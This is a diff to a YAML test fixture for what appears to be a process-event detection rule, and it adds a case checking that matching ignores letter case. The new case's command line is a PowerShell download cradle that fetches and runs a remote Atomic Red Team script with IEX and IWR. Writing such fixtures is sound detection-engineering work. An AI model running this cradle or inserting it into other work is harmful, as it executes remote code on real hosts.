@@ -20,3 +20,9 @@ negative:
   event:
     <<: *ev
     process.command_line: powershell.exe -c "iwr https://raw.githubusercontent.com/x/y/a.ps1"
+recased_positive:
+- name: "upper-case T1055 cradle"
+  event:
+    <<: *ev
+    process.name: "POWERSHELL.EXE"
+    process.command_line: "POWERSHELL.EXE -C \"IEX (IWR HTTPS://RAW.GITHUBUSERCONTENT.COM/REDCANARYCO/ATOMIC-RED-TEAM/MASTER/ATOMICS/T1055/SRC/X.PS1); INVOKE-MALDOC\""
